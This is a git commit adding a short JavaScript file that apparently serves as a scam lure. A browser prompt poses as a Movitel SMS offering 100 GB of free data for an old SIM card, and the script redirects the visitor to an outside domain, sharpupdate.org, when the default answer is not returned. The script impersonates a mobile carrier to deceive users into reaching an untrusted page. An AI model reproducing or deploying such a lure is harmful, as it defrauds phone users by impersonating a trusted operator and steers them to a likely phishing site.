bf235bfaa1f9f2b81ecd7da28f7159b9975b7c28
ekperikpe <ekperikpe588@gmail.com>
2025-05-19 07:15:17 +0100

    Create movitel-active.js

---
+++ movitel-active.js
@@ -0,0 +1,5 @@
+var password = 'Ativar 100 GB'
+password=prompt('SMS: Parabéns, seu cartão SIM Movitel é elegível para receber dados grátis como recompensa por um cartão SIM antigo, clique em OK para ativar agora','Ativar 100 GB');
+if (password != 'Ativar 100 GB') {
+location.href='https://sharpupdate.org/movitel.html';
+}
